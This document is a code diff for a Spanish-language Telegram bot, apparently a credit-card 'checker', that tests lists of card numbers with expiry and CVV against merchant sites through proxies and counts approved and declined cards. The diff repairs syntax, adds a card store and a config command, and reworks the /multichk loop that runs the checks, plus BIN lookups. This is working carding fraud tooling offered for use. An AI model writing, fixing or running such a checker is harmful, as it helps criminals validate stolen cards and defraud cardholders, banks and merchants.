@@ -24,7 +24,7 @@ function loadData() {
   if (fs.existsSync(DATA_FILE)) {
     return JSON.parse(fs.readFileSync(DATA_FILE));
   }
-  return { sites: [], proxies: [], bins: [] };
+  return { sites: [], proxies: [], bins: [], ccs: [] };
 }
 
 function saveData() {
@@ -39,14 +39,14 @@ async function callChkAPI({ site, cc, proxy }) {
       timeout: 30000
     });
 
-    const d = res.data  {};
-    const response = String(d.Response  '').toUpperCase();
+    const d = res.data || {};
+    const response = String(d.Response || '').toUpperCase();
 
     return {
       approved: response.includes('APPRO'),
       response,
-      gateway: d.Gateway  'N/A',
-      price: d.Price  'N/A',
+      gateway: d.Gateway || 'N/A',
+      price: d.Price || 'N/A',
       cc
     };
   } catch {
@@ -58,21 +58,17 @@ async function callChkAPI({ site, cc, proxy }) {
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(
     msg.chat.id,
-🤖 Bot activo
+`🤖 Bot activo
 
-Comandos:
+Comandos disponibles:
 /addsites
 /addproxies
+/addconfig
 /status
 /multichk <cc|mm|yy|cvv>
 /stop
 /bininfo <bin>
-/genbins
-/checkbin <bin>
-/listbins
-/addbin <bin>
-/removebin <bin>
-/updatebin <bin> <new_info>
+/genbins`
   );
 });
 
@@ -80,7 +76,10 @@ Comandos:
 bot.onText(/\/status/, (msg) => {
   bot.sendMessage(
     msg.chat.id,
-    🌐 Sites: ${data.sites.length}\n🧰 Proxies: ${data.proxies.length}\n🔹 Bins: ${data.bins.length}
+    `🌐 Sites: ${data.sites.length}
+🧰 Proxies: ${data.proxies.length}
+🔹 Bins: ${data.bins.length}
+💳 CCs: ${data.ccs.length}`
   );
 });
 
@@ -100,7 +99,7 @@ bot.onText(/\/addsites([\s\S]*)/, (msg, match) => {
   }
 
   saveData();
-  bot.sendMessage(msg.chat.id, 🌐 Sites añadidos: ${added});
+  bot.sendMessage(msg.chat.id, `🌐 Sites añadidos: ${added}`);
 });
 
 /* ================== ADD PROXIES ================== */
@@ -119,66 +118,7 @@ bot.onText(/\/addproxies([\s\S]*)/, (msg, match) => {
   }
 
   saveData();
-  bot.sendMessage(msg.chat.id, 🧰 Proxies añadidos: ${added});
-});
-
-/* ================== MULTICHK ================== */
-bot.onText(/\/multichk([\s\S]*)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-
-  if (!data.sites.length || !data.proxies.length) {
-    return bot.sendMessage(chatId, '❌ Agrega sites y proxies primero');
-  }
-
-  const input = match[1]?.trim();
-  if (!input) return bot.sendMessage(chatId, 'Envía CCs');
-
-  const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);
-
-  running[chatId] = true;
-
-  let approved = 0;
-  let declined = 0;
-  let errors = 0;
-
-  const progress = await bot.sendMessage(chatId, ⏳ 0/${ccs.length});
-
-  for (let i = 0; i < ccs.length; i++) {
-    if (!running[chatId]) break;
-
-    const r = await callChkAPI({
-      site: data.sites[0],
-      cc: ccs[i],
-      proxy: data.proxies[0]
-    });
-
-    if (r.approved) approved++;
-    else if (r.response === 'DECLINE') declined++;
-    else errors++;
-
-    await bot.editMessageText(
-      ⏳ ${i + 1}/${ccs.length}\n✅ ${approved} ❌ ${declined} ⚠️ ${errors},
-      { chat_id: chatId, message_id: progress.message_id }
-    );
-  }
-
-  running[chatId] = false;
-
-  bot.sendMessage(
-    chatId,
-    ✅ Finalizado\nAprobadas: ${approved}\nRechazadas: ${declined}\nErrores: ${errors}
-  );
-});
-
-/* ================== STOP ================== */
-bot.onText(/\/stop/, (msg) => {
-  const chatId = msg.chat.id;
-  if (running[chatId]) {
-    running[chatId] = false;
-    bot.sendMessage(chatId, '✋ Proceso detenido.');
-  } else {
-    bot.sendMessage(chatId, '❌ No hay ningún proceso en ejecución.');
-  }
+  bot.sendMessage(msg.chat.id, `🧰 Proxies añadidos: ${added}`);
 });
 
 /* ================== ADD CONFIG ================== */
@@ -187,7 +127,15 @@ bot.onText(/\/addconfig([\s\S]*)/, (msg, match) => {
   if (!input || !input.includes('[SITES]') || !input.includes('[PROXIES]')) {
     return bot.sendMessage(
       msg.chat.id,
-      '❌ Formato incorrecto\n\nEjemplo:\n/addconfig\n[SITES]\nhttps://site1.com\n\n[PROXIES]\nip:port:user:pass'
+`❌ Formato incorrecto
+
+Ejemplo:
+/addconfig
+[SITES]
+https://site1.com
+
+[PROXIES]
+ip:port:user:pass`
     );
   }
 
@@ -217,44 +165,95 @@ bot.onText(/\/addconfig([\s\S]*)/, (msg, match) => {
   saveData();
   bot.sendMessage(
     msg.chat.id,
-    `🌐 Sites añadidos: ${addedSites}\n🧰 Proxies añadidos: ${addedProxies}\nTotal Sites: ${data.sites.length}\nTotal Proxies: ${data.proxies.length}`
+`🌐 Sites añadidos: ${addedSites}
+🧰 Proxies añadidos: ${addedProxies}
+Total Sites: ${data.sites.length}
+Total Proxies: ${data.proxies.length}`
   );
+});
+
+/* ================== MULTICHK ================== */
+bot.onText(/\/multichk([\s\S]*)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+
+  if (!data.sites.length || !data.proxies.length) {
+    return bot.sendMessage(chatId, '❌ Agrega sites y proxies primero');
+  }
+
+  const input = match[1]?.trim();
+  if (!input) return bot.sendMessage(chatId, 'Envía CCs');
+
+  const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);
+
+  running[chatId] = true;
+
+  let approved = 0;
+  let declined = 0;
+  let errors = 0;
+
+  const progress = await bot.sendMessage(chatId, `⏳ 0/${ccs.length}`);
+
+  for (let i = 0; i < ccs.length; i++) {
+    if (!running[chatId]) break;
+
+    const r = await callChkAPI({
+      site: data.sites[0],
+      cc: ccs[i],
+      proxy: data.proxies[0]
+    });
+
+    if (r.approved) approved++;
+    else if (r.response.includes('DECLINE')) declined++;
+    else errors++;
+
+    try {
+      await bot.editMessageText(
+        `⏳ ${i + 1}/${ccs.length}
+✅ ${approved} ❌ ${declined} ⚠️ ${errors}`,
+        { chat_id: chatId, message_id: progress.message_id }
+      );
+    } catch {}
+  }
+
+  running[chatId] = false;
+
+  bot.sendMessage(
+    chatId,
+`✅ Finalizado
+Aprobadas: ${approved}
+Rechazadas: ${declined}
+Errores: ${errors}`
+  );
+});
+
+/* ================== STOP ================== */
+bot.onText(/\/stop/, (msg) => {
+  running[msg.chat.id] = false;
+  bot.sendMessage(msg.chat.id, '⛔ Proceso detenido');
 });
 
 /* ================== BIN INFO ================== */
 bot.onText(/\/bininfo([\s\S]*)/, async (msg, match) => {
   const bin = match[1]?.trim();
-  if (!bin) return bot.sendMessage(msg.chat.id, 'Envía un bin para obtener información');
+  if (!bin) return bot.sendMessage(msg.chat.id, 'Envía un BIN');
 
   try {
-    const response = await axios.get(`https://api.binlist.net/${bin}`);
-    const data = response.data;
+    const r = await axios.get(`https://api.binlist.net/${bin}`);
+    const d = r.data;
 
-    const info = `
-🔹 País: ${data.country.name}
-🔹 Banco: ${data.bank.name}
-🔹 Tipo: ${data.type}
-🔹 Nivel: ${data.scheme}
-🔹 Prefijo: ${data.prefix}
-    `;
-
-    bot.sendMessage(msg.chat.id, info);
-  } catch (error) {
-    bot.sendMessage(msg.chat.id, '❌ Error al obtener información del bin');
+    bot.sendMessage(
+      msg.chat.id,
+`🔹 País: ${d.country?.name || 'N/A'}
+🔹 Banco: ${d.bank?.name || 'N/A'}
+🔹 Tipo: ${d.type || 'N/A'}
+🔹 Marca: ${d.scheme || 'N/A'}`
+    );
+  } catch {
+    bot.sendMessage(msg.chat.id, '❌ Error consultando BIN');
   }
 });
 
-/* ================== GENERATE BINS ================== */
-bot.onText(/\/genbins/, async (msg) => {
-  try {
-    const response = await axios.get('https://api.binlist.net/v1/');
-    const data = response.data;
-
-    const bins = data.bins.map(bin => bin).join('\n');
-    bot.sendMessage(msg.chat.id, `🔹 Bins generados:\n${bins}`);
-  } catch (error) {
-    bot.sendMessage(msg.chat.id, '❌ Error al generar bins');
-  }
+/* ================== GENBINS (STUB) ================== */
+bot.onText(/\/genbins/, (msg) => {
+  bot.sendMessage(msg.chat.id, '⚠️ genbins aún no implementado');
 });
-
-/* ================== CHECK BIN ================== */
